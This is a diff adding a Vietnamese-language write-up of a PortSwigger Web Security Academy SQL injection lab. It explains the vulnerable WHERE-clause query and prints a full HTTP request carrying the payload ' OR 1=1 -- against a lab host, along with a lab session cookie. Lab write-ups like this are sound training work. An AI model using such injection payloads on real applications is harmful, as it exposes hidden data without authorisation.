@@ -38,6 +38,32 @@ SQL Injection (SQLi) là một dạng tấn công bảo mật trong đó kẻ t�
 ## Solve SQL Injection Labs
 ---
 ### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+Phòng thí nghiệm này chứa lỗ hổng SQL trong bộ lọc danh mục sản phẩm, khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+**Payload**
+
+```http
+GET /filter?category=' OR 1=1 -- HTTP/2
+Host: 0aa400cc04b07ef3818389f900dd00df.web-security-academy.net
+Cookie: session=yZBtDkvQeeDa4uB73dOkqbid2NF9Yiq2
+Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa400cc04b07ef3818389f900dd00df.web-security-academy.net/filter?category=Pets
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+```
 
 
 ---
